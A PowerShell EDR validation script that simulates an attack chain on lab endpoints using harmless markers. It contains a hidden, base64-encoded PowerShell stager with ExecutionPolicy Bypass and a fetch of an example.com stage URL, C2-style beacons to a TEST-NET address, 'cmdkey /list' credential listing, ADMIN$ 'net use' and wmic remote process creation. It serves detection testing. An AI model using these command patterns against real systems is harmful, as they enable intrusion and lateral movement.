#Requires -Version 5.1
# Harmless attack-story smoke for EDR story-alert validation.
# It generates a single scenario_id across stager, beacon, SMB lateral and credential steps.
# Run only on lab/VM endpoints. Default remote targets use RFC 5737 TEST-NET ranges.

param(
    [string] $ScenarioId = "",
    [string] $CampaignId = "",
    [int] $BeaconCount = 4,
    [int] $BeaconIntervalMs = 900,
    [string] $C2Host = "198.51.100.23",
    [int] $C2Port = 443,
    [string] $C2Url = "",
    [string] $RemoteHost = "192.0.2.44",
    [string] $RemoteShare = "",
    [string] $OutDir = "",
    [switch] $ManifestOnly,
    [switch] $NoNetworkAttempts,
    [switch] $KeepArtifacts,
    [switch] $DryRun
)

$ErrorActionPreference = "Continue"

if ([string]::IsNullOrWhiteSpace($ScenarioId)) {
    $ScenarioId = "STORY-{0}-{1}" -f (Get-Date -Format "yyyyMMddHHmmss"), (Get-Random -Minimum 1000 -Maximum 9999)
}
if ([string]::IsNullOrWhiteSpace($CampaignId)) {
    $CampaignId = "CAMP-{0}" -f (Get-Date -Format "yyyyMMdd")
}
if ([string]::IsNullOrWhiteSpace($C2Url)) {
    $C2Url = "https://example.com/edr-story/$ScenarioId/stage.ps1"
}
if ([string]::IsNullOrWhiteSpace($RemoteShare)) {
    $RemoteShare = "\\$RemoteHost\ADMIN$"
}
if ([string]::IsNullOrWhiteSpace($OutDir)) {
    $OutDir = Join-Path $env:TEMP ("edr_story_smoke_{0}" -f $ScenarioId)
}

New-Item -ItemType Directory -Path $OutDir -Force | Out-Null

$script:Events = New-Object System.Collections.Generic.List[object]
$script:Edges = New-Object System.Collections.Generic.List[object]
$script:Artifacts = New-Object System.Collections.Generic.List[string]
$script:RootProcessKey = "process:powershell.exe:$PID"
$script:HostKey = "host:$env:COMPUTERNAME"
$script:BeaconProcessKey = "process:powershell.exe:${ScenarioId}:beacon"
$script:StagerProcessKey = "process:powershell.exe:${ScenarioId}:stager"

function Get-IsoNow {
    return (Get-Date).ToUniversalTime().ToString("o")
}

function New-ShortId {
    param([string] $Prefix)
    return "{0}-{1}" -f $Prefix, ([Guid]::NewGuid().ToString("N").Substring(0, 12))
}

function Add-StoryEvent {
    param(
        [string] $EventId,
        [string] $Stage,
        [string] $Tactic,
        [string] $Technique,
        [string] $EventType,
        [string] $Summary,
        [string] $EntityType,
        [string] $EntityKey,
        [string] $CausalId,
        [string] $ParentCausalId,
        [string] $CommandLine,
        [hashtable] $Payload,
        [string[]] $ExpectedRuleIds,
        [double] $ScoreHint = 70
    )
    if ([string]::IsNullOrWhiteSpace($EventId)) {
        $EventId = New-ShortId "evt"
    }
    if ($null -eq $Payload) {
        $Payload = @{}
    }
    $Payload["schema_version"] = 1
    $Payload["scenario_id"] = $ScenarioId
    $Payload["campaign_id"] = $CampaignId
    $Payload["causal_id"] = $CausalId
    if (-not [string]::IsNullOrWhiteSpace($ParentCausalId)) {
        $Payload["parent_causal_id"] = $ParentCausalId
    }
    $evt = [ordered]@{
        event_id = $EventId
        ts = Get-IsoNow
        scenario_id = $ScenarioId
        campaign_id = $CampaignId
        stage = $Stage
        tactic = $Tactic
        technique = $Technique
        event_type = $EventType
        summary = $Summary
        entity_type = $EntityType
        entity_key = $EntityKey
        causal_id = $CausalId
        parent_causal_id = $ParentCausalId
        command_line = $CommandLine
        payload_json = $Payload
        expected_rule_ids = $ExpectedRuleIds
        key_event_candidate = $true
        score_hint = $ScoreHint
    }
    [void]$script:Events.Add($evt)
    return $evt
}

function Add-GraphEdge {
    param(
        [string] $EdgeType,
        [string] $FromType,
        [string] $FromKey,
        [string] $ToType,
        [string] $ToKey,
        [string] $Reason,
        [double] $Confidence = 0.75,
        [string[]] $EventRefs = @()
    )
    $edge = [ordered]@{
        edge_id = New-ShortId "edge"
        edge_type = $EdgeType
        from_type = $FromType
        from_key = $FromKey
        to_type = $ToType
        to_key = $ToKey
        reason = $Reason
        confidence = $Confidence
        event_refs = $EventRefs
        scenario_id = $ScenarioId
        campaign_id = $CampaignId
    }
    [void]$script:Edges.Add($edge)
}

function Invoke-StoryStep {
    param(
        [string] $Name,
        [scriptblock] $Block
    )
    Write-Host ("[story-smoke] {0}" -f $Name) -ForegroundColor Cyan
    if ($DryRun -or $ManifestOnly) {
        return
    }
    try {
        & $Block
    } catch {
        Write-Host ("  warning: {0}" -f $_) -ForegroundColor DarkGray
    }
    Start-Sleep -Milliseconds 250
}

function ConvertTo-EncodedCommand {
    param([string] $Text)
    $bytes = [Text.Encoding]::Unicode.GetBytes($Text)
    return [Convert]::ToBase64String($bytes)
}

function Start-WindowsProcess {
    param(
        [string] $FilePath,
        [string[]] $Arguments
    )
    if (-not (Get-Command $FilePath -ErrorAction SilentlyContinue)) {
        Write-Host ("  skip: {0} not found" -f $FilePath) -ForegroundColor DarkGray
        return
    }
    Start-Process -FilePath $FilePath -ArgumentList $Arguments -NoNewWindow -Wait
}

Write-Host "edr_attack_story_smoke.ps1: starting" -ForegroundColor Green
Write-Host "  ScenarioId=$ScenarioId"
Write-Host "  CampaignId=$CampaignId"
Write-Host "  OutDir=$OutDir"
Write-Host "  ManifestOnly=$ManifestOnly DryRun=$DryRun NoNetworkAttempts=$NoNetworkAttempts"

$rootCausal = "root:$ScenarioId"
$stagerCausal = "stager:$ScenarioId"
$beaconCausal = "beacon:$ScenarioId"
$dropCausal = "filedrop:$ScenarioId"
$smbCausal = "smb:$ScenarioId"
$svcCausal = "service:$ScenarioId"
$wmiCausal = "wmi:$ScenarioId"
$credCausal = "cred:$ScenarioId"
$discCausal = "discovery:$ScenarioId"

$rootEvent = Add-StoryEvent `
    -EventId (New-ShortId "root") `
    -Stage "initial_access" `
    -Tactic "Initial Access" `
    -Technique "T1204" `
    -EventType "scenario_start" `
    -Summary "EDR attack story smoke scenario start" `
    -EntityType "host" `
    -EntityKey $script:HostKey `
    -CausalId $rootCausal `
    -ParentCausalId "" `
    -CommandLine ("powershell.exe -File edr_attack_story_smoke.ps1 -ScenarioId {0}" -f $ScenarioId) `
    -Payload @{ category = "other"; process_name = "powershell.exe"; pid = $PID; hostname = $env:COMPUTERNAME } `
    -ExpectedRuleIds @() `
    -ScoreHint 40

$stagerCommand = "Write-Output 'EDR_STORY_SMOKE scenario_id=$ScenarioId campaign_id=$CampaignId stage=stager'; `$u='$C2Url'; IEX ('Write-Output stager_loaded'); try { Invoke-WebRequest -Uri `$u -UseBasicParsing -TimeoutSec 3 | Out-Null } catch {}"
$encodedStager = ConvertTo-EncodedCommand $stagerCommand
$stagerArgs = @("-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", $encodedStager)
$stagerLine = "powershell.exe " + ($stagerArgs -join " ")
$stagerEvent = Add-StoryEvent `
    -EventId (New-ShortId "stager") `
    -Stage "execution" `
    -Tactic "Execution" `
    -Technique "T1059.001" `
    -EventType "process_create" `
    -Summary "PowerShell stager with encoded command and IEX marker" `
    -EntityType "process" `
    -EntityKey $script:StagerProcessKey `
    -CausalId $stagerCausal `
    -ParentCausalId $rootCausal `
    -CommandLine $stagerLine `
    -Payload @{ category = "process"; process_name = "powershell.exe"; cmdline = $stagerLine; decoded_command = $stagerCommand; parent_pid = $PID; command_intent = "powershell_stager" } `
    -ExpectedRuleIds @("R-EXEC-001", "R-EXEC-002", "R-EXEC-005", "R-FILELESS-001") `
    -ScoreHint 88
Add-GraphEdge -EdgeType "SPAWNED" -FromType "process" -FromKey $script:RootProcessKey -ToType "process" -ToKey $script:StagerProcessKey -Reason "story smoke launches encoded PowerShell stager" -Confidence 0.85 -EventRefs @($stagerEvent.event_id)

Invoke-StoryStep "PowerShell stager" {
    Start-WindowsProcess -FilePath "powershell.exe" -Arguments $stagerArgs
}

$dropPath = Join-Path $OutDir ("story_payload_{0}.txt" -f $ScenarioId)
$dropContent = "EDR_STORY_SMOKE scenario_id=$ScenarioId campaign_id=$CampaignId stage=file_drop"
$dropCmd = "Set-Content -Path '$dropPath' -Value '$dropContent'; try { Get-FileHash -Path '$dropPath' -Algorithm SHA256 | Out-String | Write-Output } catch {}"
$dropArgs = @("-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", $dropCmd)
$dropLine = "powershell.exe " + ($dropArgs -join " ")
$dropEvent = Add-StoryEvent `
    -EventId (New-ShortId "file") `
    -Stage "defense_evasion" `
    -Tactic "Defense Evasion" `
    -Technique "T1105" `
    -EventType "file_write" `
    -Summary "Story smoke payload file drop marker" `
    -EntityType "file" `
    -EntityKey ("file:{0}" -f $dropPath) `
    -CausalId $dropCausal `
    -ParentCausalId $stagerCausal `
    -CommandLine $dropLine `
    -Payload @{ category = "file"; file_path = $dropPath; operation = "write"; process_name = "powershell.exe"; cmdline = $dropLine } `
    -ExpectedRuleIds @("R-EXEC-005") `
    -ScoreHint 72
[void]$script:Artifacts.Add($dropPath)
Add-GraphEdge -EdgeType "WROTE_FILE" -FromType "process" -FromKey $script:StagerProcessKey -ToType "file" -ToKey ("file:{0}" -f $dropPath) -Reason "stager drops harmless payload marker" -Confidence 0.72 -EventRefs @($dropEvent.event_id)

Invoke-StoryStep "File drop marker" {
    Start-WindowsProcess -FilePath "powershell.exe" -Arguments $dropArgs
}

$connectSnippet = "Write-Output 'network_skipped'"
if (-not $NoNetworkAttempts) {
    $connectSnippet = "try { `$tcp=New-Object Net.Sockets.TcpClient; `$ar=`$tcp.BeginConnect('$C2Host',$C2Port,`$null,`$null); [void]`$ar.AsyncWaitHandle.WaitOne(700); `$tcp.Close() } catch {}"
}
$beaconRemote = "${C2Host}:$C2Port"
$beaconCommand = "for (`$i=1; `$i -le $BeaconCount; `$i++) { Write-Output 'EDR_STORY_SMOKE scenario_id=$ScenarioId campaign_id=$CampaignId stage=beacon remote=$beaconRemote'; $connectSnippet; Start-Sleep -Milliseconds $BeaconIntervalMs }"
$beaconArgs = @("-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", $beaconCommand)
$beaconLine = "powershell.exe " + ($beaconArgs -join " ")
$beaconEventIds = @()
for ($i = 1; $i -le $BeaconCount; $i++) {
    $evt = Add-StoryEvent `
        -EventId (New-ShortId ("beacon{0}" -f $i)) `
        -Stage "command_and_control" `
        -Tactic "Command and Control" `
        -Technique "T1071.001" `
        -EventType "network_connect" `
        -Summary ("C2 beacon simulation {0}/{1} to {2}:{3}" -f $i, $BeaconCount, $C2Host, $C2Port) `
        -EntityType "network" `
        -EntityKey ("ip:{0}:{1}" -f $C2Host, $C2Port) `
        -CausalId ("{0}:{1}" -f $beaconCausal, $i) `
        -ParentCausalId $stagerCausal `
        -CommandLine $beaconLine `
        -Payload @{ category = "network"; direction = "outbound"; protocol = "tcp"; dest_ip = $C2Host; dest_port = $C2Port; domain = "example.com"; bytes_sent = (96 + $i); bytes_recv = (128 + $i); beacon_sequence = $i; beacon_interval_ms = $BeaconIntervalMs; process_name = "powershell.exe"; cmdline = $beaconLine } `
        -ExpectedRuleIds @("R-EXEC-005") `
        -ScoreHint 86
    $beaconEventIds += $evt.event_id
}
Add-GraphEdge -EdgeType "CONNECTED_TO" -FromType "process" -FromKey $script:BeaconProcessKey -ToType "network" -ToKey ("ip:{0}:{1}" -f $C2Host, $C2Port) -Reason "periodic C2 beacon simulation" -Confidence 0.82 -EventRefs $beaconEventIds

Invoke-StoryStep "C2 beacon simulation" {
    Start-WindowsProcess -FilePath "powershell.exe" -Arguments $beaconArgs
}

$discoveryCmd = "whoami && hostname && ipconfig /all"
$discoveryArgs = @("/c", $discoveryCmd)
$discoveryLine = "cmd.exe " + ($discoveryArgs -join " ")
$discEvent = Add-StoryEvent `
    -EventId (New-ShortId "disc") `
    -Stage "discovery" `
    -Tactic "Discovery" `
    -Technique "T1082" `
    -EventType "process_create" `
    -Summary "Host and network discovery command group" `
    -EntityType "process" `
    -EntityKey "process:cmd.exe:discovery" `
    -CausalId $discCausal `
    -ParentCausalId $stagerCausal `
    -CommandLine $discoveryLine `
    -Payload @{ category = "process"; process_name = "cmd.exe"; cmdline = $discoveryLine; parent_process_name = "powershell.exe"; command_intent = "host_discovery" } `
    -ExpectedRuleIds @("R-DISC-001") `
    -ScoreHint 74
Add-GraphEdge -EdgeType "SPAWNED" -FromType "process" -FromKey $script:StagerProcessKey -ToType "process" -ToKey "process:cmd.exe:discovery" -Reason "stager starts discovery command group" -Confidence 0.7 -EventRefs @($discEvent.event_id)

Invoke-StoryStep "Discovery commands" {
    Start-WindowsProcess -FilePath "cmd.exe" -Arguments $discoveryArgs
}

$credCmd = "cmdkey /list"
$credArgs = @("/c", $credCmd)
$credLine = "cmd.exe " + ($credArgs -join " ")
$credEvent = Add-StoryEvent `
    -EventId (New-ShortId "cred") `
    -Stage "credential_access" `
    -Tactic "Credential Access" `
    -Technique "T1555" `
    -EventType "process_create" `
    -Summary "Credential store listing smoke marker" `
    -EntityType "process" `
    -EntityKey "process:cmdkey.exe:list" `
    -CausalId $credCausal `
    -ParentCausalId $discCausal `
    -CommandLine $credLine `
    -Payload @{ category = "process"; process_name = "cmdkey.exe"; cmdline = $credCmd; parent_process_name = "cmd.exe"; command_intent = "credential_inventory" } `
    -ExpectedRuleIds @("R-CRED-005") `
    -ScoreHint 80
Add-GraphEdge -EdgeType "SPAWNED" -FromType "process" -FromKey "process:cmd.exe:discovery" -ToType "process" -ToKey "process:cmdkey.exe:list" -Reason "discovery chain reaches credential inventory" -Confidence 0.68 -EventRefs @($credEvent.event_id)

Invoke-StoryStep "Credential listing marker" {
    Start-WindowsProcess -FilePath "cmd.exe" -Arguments $credArgs
}

$smbCmd = "echo EDR_STORY_SMOKE scenario_id=$ScenarioId campaign_id=$CampaignId stage=smb_lateral psexec64.exe $RemoteShare"
if (-not $NoNetworkAttempts) {
    $smbCmd = $smbCmd + " && net use $RemoteShare /user:EDRStorySmoke invalid-password"
}
$smbArgs = @("/c", $smbCmd)
$smbLine = "cmd.exe " + ($smbArgs -join " ")
$smbEvent = Add-StoryEvent `
    -EventId (New-ShortId "smb") `
    -Stage "lateral_movement" `
    -Tactic "Lateral Movement" `
    -Technique "T1021.002" `
    -EventType "network_connect" `
    -Summary ("SMB/Admin$ lateral movement simulation to {0}" -f $RemoteShare) `
    -EntityType "network" `
    -EntityKey ("smb:{0}:445" -f $RemoteHost) `
    -CausalId $smbCausal `
    -ParentCausalId $credCausal `
    -CommandLine $smbLine `
    -Payload @{ category = "network"; direction = "outbound"; protocol = "tcp"; dest_ip = $RemoteHost; dest_port = 445; remote_hostname = $RemoteHost; smb_lateral_hint = $true; network_aux_path = "cmd.exe"; process_name = "cmd.exe"; cmdline = $smbLine } `
    -ExpectedRuleIds @("R-LMOVE-004", "R-LMOVE-005") `
    -ScoreHint 92
Add-GraphEdge -EdgeType "SMB_TO" -FromType "host" -FromKey $script:HostKey -ToType "host" -ToKey ("host:{0}" -f $RemoteHost) -Reason "Admin$ path and optional net use attempt" -Confidence 0.86 -EventRefs @($smbEvent.event_id)

Invoke-StoryStep "SMB lateral movement marker" {
    Start-WindowsProcess -FilePath "cmd.exe" -Arguments $smbArgs
}

$svcCmd = "echo EDR_STORY_SMOKE scenario_id=$ScenarioId campaign_id=$CampaignId stage=remote_service sc.exe \\$RemoteHost create EDRStorySmoke binPath= `"cmd.exe /c echo edr story smoke`""
$svcArgs = @("/c", $svcCmd)
$svcLine = "cmd.exe " + ($svcArgs -join " ")
$svcEvent = Add-StoryEvent `
    -EventId (New-ShortId "svc") `
    -Stage "lateral_movement" `
    -Tactic "Lateral Movement" `
    -Technique "T1569.002" `
    -EventType "process_create" `
    -Summary ("Remote service creation marker for {0}" -f $RemoteHost) `
    -EntityType "process" `
    -EntityKey "process:sc.exe:remote-create" `
    -CausalId $svcCausal `
    -ParentCausalId $smbCausal `
    -CommandLine $svcLine `
    -Payload @{ category = "process"; process_name = "sc.exe"; cmdline = $svcCmd; remote_hostname = $RemoteHost; command_intent = "remote_service_create" } `
    -ExpectedRuleIds @("R-LMOVE-004", "R-LMOVE-005") `
    -ScoreHint 88
Add-GraphEdge -EdgeType "SERVICE_CREATED" -FromType "host" -FromKey $script:HostKey -ToType "host" -ToKey ("host:{0}" -f $RemoteHost) -Reason "remote service creation command line marker" -Confidence 0.82 -EventRefs @($svcEvent.event_id)

Invoke-StoryStep "Remote service creation marker" {
    Start-WindowsProcess -FilePath "cmd.exe" -Arguments $svcArgs
}

$wmiLine = "wmic.exe /node:$RemoteHost process call create `"cmd.exe /c echo EDR_STORY_SMOKE scenario_id=$ScenarioId stage=wmi_lateral`""
$wmiEvent = Add-StoryEvent `
    -EventId (New-ShortId "wmi") `
    -Stage "lateral_movement" `
    -Tactic "Lateral Movement" `
    -Technique "T1047" `
    -EventType "process_create" `
    -Summary ("WMI remote process creation simulation to {0}" -f $RemoteHost) `
    -EntityType "process" `
    -EntityKey "process:wmic.exe:remote-create" `
    -CausalId $wmiCausal `
    -ParentCausalId $smbCausal `
    -CommandLine $wmiLine `
    -Payload @{ category = "process"; process_name = "wmic.exe"; cmdline = $wmiLine; remote_hostname = $RemoteHost; command_intent = "remote_process_create" } `
    -ExpectedRuleIds @("R-LOLBIN-005") `
    -ScoreHint 86
Add-GraphEdge -EdgeType "REMOTE_EXEC" -FromType "host" -FromKey $script:HostKey -ToType "host" -ToKey ("host:{0}" -f $RemoteHost) -Reason "WMI process call create command line" -Confidence 0.8 -EventRefs @($wmiEvent.event_id)

Invoke-StoryStep "WMI lateral movement marker" {
    if ($NoNetworkAttempts) {
        Start-WindowsProcess -FilePath "cmd.exe" -Arguments @("/c", ("echo {0}" -f $wmiLine))
    } else {
        if (Get-Command "wmic.exe" -ErrorAction SilentlyContinue) {
            Start-Process -FilePath "wmic.exe" -ArgumentList @("/node:$RemoteHost", "process", "call", "create", "cmd.exe /c echo EDR_STORY_SMOKE scenario_id=$ScenarioId stage=wmi_lateral") -NoNewWindow -Wait
        } else {
            Write-Host "  skip: wmic.exe not found" -ForegroundColor DarkGray
        }
    }
}

$expectedStages = @(
    "initial_access",
    "execution",
    "defense_evasion",
    "command_and_control",
    "discovery",
    "credential_access",
    "lateral_movement"
)

$manifestPath = Join-Path $OutDir ("edr_attack_story_smoke_manifest_{0}.json" -f $ScenarioId)
$manifest = [ordered]@{
    schema_version = 1
    kind = "edr_attack_story_smoke"
    story_version = "p1"
    scenario_id = $ScenarioId
    campaign_id = $CampaignId
    created_at = Get-IsoNow
    host = $env:COMPUTERNAME
    pid = $PID
    safety = [ordered]@{
        harmless = $true
        reserved_test_net_targets = @($C2Host, $RemoteHost)
        no_network_attempts = [bool]$NoNetworkAttempts
        manifest_only = [bool]$ManifestOnly
        dry_run = [bool]$DryRun
    }
    expected_story = [ordered]@{
        title = "Cobalt Strike style beacon: PowerShell stager + SMB egress"
        severity = "high"
        graph_fingerprint_seed = ("story-p1|{0}|powershell|beacon|smb|wmi" -f $ScenarioId)
        stage_sequence = $expectedStages
        primary_stage = "command_and_control"
        primary_process_family = "powershell"
        affected_endpoint_hint = $env:COMPUTERNAME
        expected_member_min = 7
    }
    events = $script:Events
    graph_edges = $script:Edges
    artifacts = $script:Artifacts
}

$manifest | ConvertTo-Json -Depth 16 | Set-Content -Path $manifestPath -Encoding UTF8

if ((-not $KeepArtifacts) -and (-not $ManifestOnly) -and (-not $DryRun)) {
    foreach ($p in $script:Artifacts) {
        try {
            if (Test-Path $p) {
                Remove-Item -Path $p -Force -ErrorAction SilentlyContinue
            }
        } catch {}
    }
}

Write-Host "`nDone. ScenarioId=$ScenarioId" -ForegroundColor Green
Write-Host ("Manifest: {0}" -f $manifestPath) -ForegroundColor Gray
Write-Host ("Events={0} GraphEdges={1}" -f $script:Events.Count, $script:Edges.Count) -ForegroundColor Gray
Write-Host "Expected: story alert should aggregate stager + beacon + SMB/WMI into one attack story." -ForegroundColor Gray
exit 0
